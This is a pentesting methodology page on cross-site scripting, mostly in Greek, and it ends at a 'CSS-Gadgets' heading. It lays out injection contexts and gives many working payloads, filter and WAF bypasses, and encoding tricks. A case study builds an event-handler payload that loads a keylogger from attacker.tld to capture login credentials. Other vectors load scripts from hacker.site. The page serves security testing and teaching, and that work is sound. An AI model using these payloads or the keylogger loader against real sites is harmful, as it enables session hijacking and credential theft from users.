# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Έλεγξε αν **οποιαδήποτε τιμή που ελέγχεις** (_parameters_, _path_, _headers_?, _cookies_?) **αντανακλάται** στο HTML ή **χρησιμοποιείται** από **JS** κώδικα.
2. **Βρες το context** όπου αντανακλάται/χρησιμοποιείται.
3. Εάν είναι **reflected**
1. Έλεγξε **ποια σύμβολα μπορείς να χρησιμοποιήσεις** και ανάλογα ετοίμασε το payload:
1. Σε **raw HTML**:
1. Μπορείς να δημιουργήσεις νέα HTML tags;
2. Μπορείς να χρησιμοποιήσεις events ή attributes που υποστηρίζουν το `javascript:` protocol;
3. Μπορείς να παρακάμψεις προστασίες;
4. Ερμηνεύεται το HTML περιεχόμενο από κάποια client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), οπότε μπορείς να εκμεταλλευτείς ένα [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Αν δεν μπορείς να δημιουργήσεις HTML tags που εκτελούν JS κώδικα, μπορείς να εκμεταλλευτείς ένα [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html);
2. Μέσα σε ένα **HTML tag**:
1. Μπορείς να ξεφύγεις στο raw HTML context;
2. Μπορείς να δημιουργήσεις νέα events/attributes για να εκτελέσεις JS κώδικα;
3. Το attribute όπου είσαι περιορισμένος υποστηρίζει εκτέλεση JS;
4. Μπορείς να παρακάμψεις προστασίες;
3. Μέσα σε **JavaScript code**:
1. Μπορείς να διαφύγεις το `<script>` tag;
2. Μπορείς να διαφύγεις το string και να εκτελέσεις διαφορετικό JS κώδικα;
3. Είναι η είσοδός σου σε template literals ````;
4. Μπορείς να παρακάμψεις προστασίες;
4. Javascript **function** που εκτελείται
1. Μπορείς να δηλώσεις το όνομα της function που θα εκτελεστεί. π.χ.: `?callback=alert(1)`
4. Εάν είναι **used**:
1. Μπορείς να εκμεταλλευτείς ένα **DOM XSS**, πρόσεξε πώς ελέγχεται η είσοδός σου και αν η **ελεγχόμενη είσοδος χρησιμοποιείται από κάποιο sink.**

Όταν δουλεύεις σε ένα πολύπλοκο XSS μπορεί να σε ενδιαφέρει να διαβάσεις:

{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflected values

Για να εκμεταλλευτείς επιτυχώς ένα XSS, το πρώτο που πρέπει να βρεις είναι μια **τιμή που ελέγχεις και αντανακλάται** στη σελίδα.

- **Ενδιάμεσα αντανακλώμενο**: Αν βρεις ότι η τιμή ενός παραμέτρου ή ακόμη και το path αντανακλάται στη σελίδα, μπορείς να εκμεταλλευτείς ένα **Reflected XSS**.
- **Αποθηκευμένο και αντανακλώμενο**: Αν βρεις ότι μια τιμή που ελέγχεις αποθηκεύεται στον server και αντανακλάται κάθε φορά που ανοίγεις τη σελίδα, μπορείς να εκμεταλλευτείς ένα **Stored XSS**.
- **Προσπελάζεται μέσω JS**: Αν βρεις ότι μια τιμή που ελέγχεις προσπελάζεται μέσω JS, μπορείς να εκμεταλλευτείς ένα **DOM XSS**.

## Contexts

Κατά την προσπάθεια εκμετάλλευσης ενός XSS, το πρώτο που πρέπει να μάθεις είναι **πού αντανακλάται η είσοδός σου**. Ανάλογα με το context, θα μπορείς να εκτελέσεις αυθαίρετο JS κώδικα με διαφορετικούς τρόπους.

### Raw HTML

Αν η είσοδός σου **αντανακλάται στο raw HTML** της σελίδας, θα χρειαστεί να εκμεταλλευτείς κάποιο **HTML tag** για να εκτελέσεις JS κώδικα: `<img , <iframe , <svg , <script` ... αυτά είναι μερικά από τα πολλά HTML tags που μπορείς να χρησιμοποιήσεις.\
Επίσης, να έχεις υπόψη το [Client Side Template Injection](../client-side-template-injection-csti.md).

### Μέσα σε attribute HTML tag

Αν η είσοδός σου αντανακλάται μέσα στην τιμή ενός attribute μιας ετικέτας, μπορείς να δοκιμάσεις:

1. Να **δραπετεύσεις από το attribute και από το tag** (τότε θα βρεθείς στο raw HTML) και να δημιουργήσεις νέο HTML tag προς εκμετάλλευση: `"><img [...]`
2. Αν **μπορείς να δραπετεύσεις από το attribute αλλά όχι από το tag** (`>` κωδικοποιείται ή διαγράφεται), ανάλογα με το tag μπορείς να **δημιουργήσεις ένα event** που εκτελεί JS κώδικα: `" autofocus onfocus=alert(1) x="`
3. Αν **δεν μπορείς να δραπετεύσεις από το attribute** (`"` κωδικοποιείται ή διαγράφεται), τότε ανάλογα με **ποιο attribute** αντανακλάται η τιμή σου και **αν ελέγχεις όλη την τιμή ή μόνο ένα μέρος**, θα μπορέσεις να το εκμεταλλευτείς. Για **παράδειγμα**, αν ελέγχεις ένα event όπως `onclick=` θα μπορείς να το κάνεις να εκτελεί αυθαίρετο κώδικα όταν γίνει click. Ένα άλλο ενδιαφέρον **παράδειγμα** είναι το attribute `href`, όπου μπορείς να χρησιμοποιήσεις το `javascript:` protocol για να εκτελέσεις αυθαίρετο κώδικα: **`href="javascript:alert(1)"`**
4. Αν η είσοδός σου αντανακλάται μέσα σε "**μη εκμεταλλεύσιμες ετικέτες**" μπορείς να δοκιμάσεις το κόλπο **`accesskey`** για να εκμεταλλεύσεις την ευπάθεια (θα χρειαστεί κάποιο social engineering για να το εκτελέσεις): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS πίσω από WAFs

Μια εταιρική σελίδα login SSO αντανακλούσε την παράμετρο OAuth `service` μέσα στο `href` attribute του `<a id="forgot_btn" ...>`. Παρόλο που τα `<` και `>` κωδικοποιούνταν ως HTML entities, τα διπλά εισαγωγικά δεν κωδικοποιούνταν, οπότε ο επιτιθέμενος μπορούσε να κλείσει το attribute και να επαναχρησιμοποιήσει το ίδιο στοιχείο για να εισάγει handlers όπως `" onfocus="payload" x="`.

1. **Εισαγωγή του handler:** Απλά payloads όπως `onclick="print(1)"` μπλοκάρονταν, αλλά ο WAF εξέταζε μόνο την πρώτη JavaScript δήλωση σε inline attributes. Τοποθετώντας μια αβλαβή έκφραση τυλιγμένη σε παρενθέσεις, και μετά ένα ερωτηματικό, επέτρεπε στο πραγματικό payload να εκτελεστεί: `onfocus="(history.length);malicious_code_here"`.
2. **Αυτόματη ενεργοποίηση:** Οι browsers βάζουν focus σε οποιοδήποτε στοιχείο cuyo `id` ταιριάζει με το fragment, οπότε προσθέτοντας `#forgot_btn` στο URL του exploit αναγκάζει το anchor να πάρει focus κατά τη φόρτωση της σελίδας και τρέχει το handler χωρίς να χρειαστεί click.
3. **Κράτησε το inline stub μικρό:** Ο στόχος ήδη είχε jQuery. Ο handler χρειαζόταν μόνο να κάνει bootstrap ένα request μέσω `$.getScript(...)` ενώ το πλήρες keylogger ήταν στον server του επιτιθέμενου.

**Κατασκευή string χωρίς εισαγωγικά**

Τα μονά εισαγωγικά επέστρεφαν URL-encoded και τα escaped διπλά εισαγωγικά διέφθειραν το attribute, οπότε το payload γεννούσε κάθε string με `String.fromCharCode`. Μια βοηθητική συνάρτηση κάνει εύκολο το να μετατρέψεις οποιοδήποτε URL σε char codes πριν το επικολλήσεις στο attribute:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Ένα προκύπτον attribute έμοιαζε ως εξής:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Γιατί αυτό κλέβει διαπιστευτήρια**

Το εξωτερικό script (loaded from an attacker-controlled host or Burp Collaborator) hooked `document.onkeypress`, buffered keystrokes, και κάθε δευτερόλεπτο εξέδιδε `new Image().src = collaborator_url + keys`. Επειδή το XSS ενεργοποιείται μόνο για unauthenticated users, η ευαίσθητη ενέργεια είναι η ίδια η login φόρμα — ο attacker keylogs τα usernames και passwords ακόμα κι αν το θύμα δεν πατήσει ποτέ το "Login".

Παράξενο παράδειγμα του Angular που εκτελεί XSS αν ελέγχεις ένα class name:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Μέσα στον JavaScript κώδικα

Σε αυτή την περίπτωση η είσοδός σας αντανακλάται ανάμεσα σε **`<script> [...] </script>`** tags μιας HTML σελίδας, μέσα σε `.js` αρχείο ή μέσα σε ένα attribute που χρησιμοποιεί το **`javascript:`** πρωτόκολλο:

- Αν αντανακλάται ανάμεσα σε **`<script> [...] </script>`** tags, ακόμη και αν η είσοδός σας είναι μέσα σε οποιοδήποτε είδος quotes, μπορείτε να προσπαθήσετε να εισαγάγετε `</script>` και να διαφύγετε από αυτό το context. Αυτό λειτουργεί επειδή ο **browser θα πρώτα αναλύσει τα HTML tags** και μετά το περιεχόμενο, επομένως δεν θα παρατηρήσει ότι το εισαγόμενο `</script>` tag είναι μέσα στον HTML κώδικα.
- Αν αντανακλάται **μέσα σε ένα JS string** και το προηγούμενο κόλπο δεν λειτουργεί θα χρειαστεί να **βγείτε** από το string, **εκτελέσετε** τον κώδικά σας και **ανασυνθέσετε** τον JS κώδικα (αν υπάρχει κάποιο σφάλμα, δεν θα εκτελεστεί:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Εάν αντανακλάται μέσα σε template literals μπορείτε να **ενσωματώσετε JS εκφράσεις** χρησιμοποιώντας τη σύνταξη `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** δουλεύει για να γράψετε **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Το Javascript Hoisting αναφέρεται στην ευκαιρία να **declare functions, variables or classes after they are used so you can abuse scenarios where a XSS is using undeclared variables or functions.**\
**Δες την παρακάτω σελίδα για περισσότερες πληροφορίες:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Πολλές ιστοσελίδες έχουν endpoints που **αποδέχονται ως παράμετρο το όνομα της function που θα εκτελεστεί**. Ένα συνηθισμένο παράδειγμα που βλέπεις στην πράξη είναι κάτι σαν: `?callback=callbackFunc`.

Ένας καλός τρόπος για να διαπιστώσεις αν κάτι που δίνεται άμεσα από τον χρήστη προσπαθεί να εκτελεστεί είναι **να τροποποιήσεις την τιμή της παραμέτρου** (για παράδειγμα σε 'Vulnerable') και να κοιτάξεις στην κονσόλα για σφάλματα όπως:

![](<../../images/image (711).png>)

Σε περίπτωση που είναι ευάλωτο, μπορείς να καταφέρεις να **προκαλέσεις ένα alert** απλά στέλνοντας την τιμή: **`?callback=alert(1)`**. Ωστόσο, είναι πολύ συνηθισμένο αυτά τα endpoints να **ελέγχουν το περιεχόμενο** ώστε να επιτρέπουν μόνο γράμματα, αριθμούς, τελείες και underscores (**`[\w\._]`**).

Ωστόσο, ακόμη και με αυτόν τον περιορισμό είναι δυνατό να εκτελέσεις κάποιες ενέργειες. Αυτό συμβαίνει επειδή μπορείς να χρησιμοποιήσεις αυτούς τους επιτρεπτούς χαρακτήρες για να **προσπελάσεις οποιοδήποτε στοιχείο στο DOM**:

![](<../../images/image (747).png>)

Μερικές χρήσιμες functions για αυτό:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Μπορείτε επίσης να προσπαθήσετε να **trigger Javascript functions** απευθείας: `obj.sales.delOrders`.

Ωστόσο, συνήθως τα endpoints που εκτελούν την ενδεικνυόμενη συνάρτηση είναι endpoints χωρίς πολύ ενδιαφέρον DOM, **άλλες σελίδες στην ίδια origin** θα έχουν ένα **πιο ενδιαφέρον DOM** για να εκτελέσετε περισσότερες ενέργειες.

Επομένως, προκειμένου να **εκμεταλλευτείτε αυτή την ευπάθεια σε διαφορετικό DOM** αναπτύχθηκε η εκμετάλλευση **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Υπάρχει **JS code** που χρησιμοποιεί **με ανασφαλή τρόπο** κάποια **δεδομένα ελεγχόμενα από attacker** όπως `location.href`. Ένας attacker μπορεί να το εκμεταλλευτεί για να εκτελέσει αυθαίρετο JS code.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Αυτός ο τύπος XSS μπορεί να βρεθεί **οπουδήποτε**. Δεν εξαρτώνται μόνο από την εκμετάλλευση του client μιας web εφαρμογής αλλά από **οποιοδήποτε** **context**. Αυτό το είδος **arbitrary JavaScript execution** μπορεί ακόμη να εκμεταλλευτεί για να αποκτήσει **RCE**, να **διαβάσει** **arbitrary** **files** σε clients και servers, και άλλα.\
Κάποια **παραδείγματα**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Όταν η είσοδός σας αντανακλάται **μέσα στη σελίδα HTML** ή μπορείτε να ξεφύγετε και να εισάγετε HTML κώδικα σε αυτό το context, το **πρώτο** πράγμα που πρέπει να κάνετε είναι να ελέγξετε αν μπορείτε να εκμεταλλευτείτε το `<` για να δημιουργήσετε νέα tags: Απλά δοκιμάστε να **ανακλάσετε** αυτόν τον **χαρακτήρα** και ελέγξτε αν γίνεται **HTML encoded** ή **διαγράφεται** ή αν **αντανακλάται χωρίς αλλαγές**. **Μόνο στην τελευταία περίπτωση θα μπορείτε να το εκμεταλλευτείτε**.\
Για αυτές τις περιπτώσεις **έχετε επίσης υπόψη** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Σημείωση: Ένα HTML comment μπορεί να κλείσει χρησιμοποιώντας\*\***\***\*`-->`\*\***\***\* ή \*\***`--!>`\*\*_  

Σε αυτή την περίπτωση και αν δεν χρησιμοποιείται black/whitelisting, μπορείτε να χρησιμοποιήσετε payloads όπως:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Αλλά, αν χρησιμοποιείται black/whitelisting για tags/attributes, θα χρειαστεί να **brute-force which tags** μπορείς να δημιουργήσεις.\
Μόλις έχεις **located which tags are allowed**, θα χρειαστεί να **brute-force attributes/events** μέσα στα έγκυρα tags που βρήκες για να δεις πώς μπορείς να επιτεθείς στο context.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force all the events** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### Custom tags

If you didn't find any valid HTML tag, you could try to **create a custom tag** and and execute JS code with the `onfocus` attribute. In the XSS request, you need to end the URL with `#` to make the page **focus on that object** and **execute** the code:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Εάν χρησιμοποιείται κάποιο είδος blacklist, μπορείτε να προσπαθήσετε να το παρακάμψετε με μερικά αφελή κόλπα:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Περισσότερα tiny XSS για διαφορετικά περιβάλλοντα** το payload [**μπορεί να βρεθεί εδώ**](https://github.com/terjanq/Tiny-XSS-Payloads) και [**εδώ**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Το τελευταίο χρησιμοποιεί 2 unicode χαρακτήρες που επεκτείνονται σε 5: telsr\  
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\  
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Εάν για να εκμεταλλευτείτε την ευπάθεια χρειάζεστε ο **χρήστης να κάνει κλικ σε ένα link ή μια φόρμα** με προ-συμπληρωμένα δεδομένα, μπορείτε να δοκιμάσετε να [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (εφόσον η σελίδα είναι ευάλωτη).

### Αδύνατο - Dangling Markup

Αν απλώς νομίζετε ότι **είναι αδύνατο να δημιουργήσετε ένα HTML tag με ένα attribute που να εκτελεί JS code**, θα πρέπει να ελέγξετε [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)επειδή μπορείτε να **exploit** την ευπάθεια **χωρίς** να εκτελέσετε **JS** code.

## Εισαγωγή μέσα σε HTML tag

### Μέσα στο tag/διαφυγή από την τιμή του attribute

Εάν βρίσκεστε **μέσα σε ένα HTML tag**, το πρώτο που μπορείτε να δοκιμάσετε είναι να **διαφύγετε** από το tag και να χρησιμοποιήσετε μερικές από τις τεχνικές που αναφέρονται στην [previous section](#injecting-inside-raw-html) για να εκτελέσετε JS code.\  
Αν **δεν μπορείτε να διαφύγετε από το tag**, μπορείτε να δημιουργήσετε νέα attributes μέσα στο tag για να προσπαθήσετε να εκτελέσετε JS code, για παράδειγμα χρησιμοποιώντας κάποιο payload όπως (_σημειώστε ότι σε αυτό το παράδειγμα τα double quotes χρησιμοποιούνται για να διαφύγετε από το attribute, δεν θα τα χρειαστείτε αν το input σας αντανακλάται απευθείας μέσα στο tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Συμβάντα στυλ**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Μέσα στο attribute

Ακόμα και αν **δεν μπορείτε να διαφύγετε από το attribute** (`"` είναι κωδικοποιημένο ή διαγράφεται), ανάλογα με **ποιο attribute** εμφανίζεται η τιμή σας και **αν ελέγχετε ολόκληρη την τιμή ή μόνο ένα μέρος της** θα μπορείτε να το καταχραστείτε. Για **παράδειγμα**, αν ελέγχετε ένα event όπως το `onclick=` θα μπορείτε να το κάνετε να εκτελέσει αυθαίρετο κώδικα όταν γίνει κλικ.\
Ένα ακόμα ενδιαφέρον **παράδειγμα** είναι το attribute `href`, όπου μπορείτε να χρησιμοποιήσετε το πρωτόκολλο `javascript:` για να εκτελέσετε αυθαίρετο κώδικα: **`href="javascript:alert(1)"`**

**Bypass μέσα στο event χρησιμοποιώντας HTML encoding/URL encode**

Οι **HTML encoded characters** μέσα στην τιμή των attributes των HTML tags **αποκωδικοποιούνται κατά την εκτέλεση**. Επομένως κάτι σαν το παρακάτω θα είναι έγκυρο (το payload είναι με έντονα): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Σημειώστε ότι **οποιοσδήποτε τύπος HTML encode είναι έγκυρος**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Σημειώστε ότι το URL encode θα λειτουργήσει επίσης:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass μέσα σε event χρησιμοποιώντας Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Ειδικά πρωτόκολλα εντός του attribute

Εκεί μπορείτε να χρησιμοποιήσετε τα πρωτόκολλα **`javascript:`** ή **`data:`** σε ορισμένα σημεία για να **εκτελέσετε αυθαίρετο κώδικα JS**. Κάποια θα απαιτήσουν αλληλεπίδραση χρήστη, άλλα όχι.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Μέρη όπου μπορείτε να εισάγετε αυτά τα πρωτόκολλα**

**Γενικά** το `javascript:` πρωτόκολλο μπορεί να **χρησιμοποιηθεί σε οποιοδήποτε tag που δέχεται το attribute `href`** και σε **τα περισσότερα** από τα tags που δέχονται το **attribute `src`** (αλλά όχι `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Άλλες τεχνικές obfuscation**

_**Σε αυτήν την περίπτωση, το HTML encoding και το Unicode encoding trick από την προηγούμενη ενότητα ισχύουν επίσης, καθώς βρίσκεστε μέσα σε ένα attribute.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Επιπλέον, υπάρχει ένα ακόμα **ωραίο κόλπο** για αυτές τις περιπτώσεις: **Ακόμα κι αν το input σου μέσα στο `javascript:...` γίνεται URL encoded, θα γίνει URL decoded πριν εκτελεστεί.** Οπότε, αν χρειαστεί να **escape** από το **string** χρησιμοποιώντας ένα **single quote** και βλέπεις ότι **αυτό κωδικοποιείται σε URL**, να θυμάσαι ότι **δεν έχει σημασία,** θα **ερμηνευτεί** ως **single quote** κατά τη στιγμή της **εκτέλεσης**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Σημειώστε ότι αν προσπαθήσετε να **χρησιμοποιήσετε και τα δύο** `URLencode + HTMLencode` με οποιαδήποτε σειρά για να κωδικοποιήσετε το **payload**, αυτό **δεν θα** **λειτουργήσει**, αλλά μπορείτε να **τα αναμείξετε μέσα στο payload**.

**Χρήση Hex και Octal encode με `javascript:`**

Μπορείτε να χρησιμοποιήσετε **Hex** και **Octal encode** μέσα στο attribute `src` του `iframe` (τουλάχιστον) για να δηλώσετε **HTML tags για εκτέλεση JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Αν μπορείς να εισάγεις οποιοδήποτε URL σε μια αυθαίρετη **`<a href=`** ετικέτα που περιέχει τα χαρακτηριστικά **`target="_blank" and rel="opener"`**, έλεγξε την **παρακάτω σελίδα για να εκμεταλλευτείς αυτήν τη συμπεριφορά**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Πρώτα απ' όλα έλεγξε αυτή τη σελίδα ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) για χρήσιμα **"on" event handlers**.\
Σε περίπτωση που υπάρχει κάποια blacklist που σε εμποδίζει να δημιουργήσεις αυτά τα event handlers, μπορείς να δοκιμάσεις τις παρακάτω bypasses:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS in "Unexploitable tags" (hidden input, link, canonical, meta)

Από [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **είναι πλέον δυνατό να abuse hidden inputs με:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Και σε **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Από [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Μπορείτε να εκτελέσετε ένα **XSS payload inside a hidden attribute**, υπό την προϋπόθεση ότι μπορείτε να **πείσετε** την **victim** να πατήσει τον **συνδυασμό πλήκτρων**. Σε Firefox Windows/Linux ο συνδυασμός πλήκτρων είναι **ALT+SHIFT+X** και σε OS X είναι **CTRL+ALT+X**. Μπορείτε να καθορίσετε διαφορετικό συνδυασμό πλήκτρων χρησιμοποιώντας διαφορετικό πλήκτρο στο access key attribute. Ορίστε το vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Το XSS payload θα είναι κάτι σαν το εξής: `" accesskey="x" onclick="alert(1)" x="`**

### Παρακάμψεις Blacklist

Έχουν ήδη παρουσιαστεί αρκετά κόλπα με τη χρήση διαφορετικής κωδικοποίησης μέσα σε αυτή την ενότητα. Επιστρέψτε για να μάθετε πού μπορείτε να χρησιμοποιήσετε:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Διαβάστε τις [Blacklist Bypasses της προηγούμενης ενότητας](#blacklist-bypasses).

**Bypasses for JavaScript code**

Διαβάστε την J[avaScript bypass blacklist της επόμενης ενότητας](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

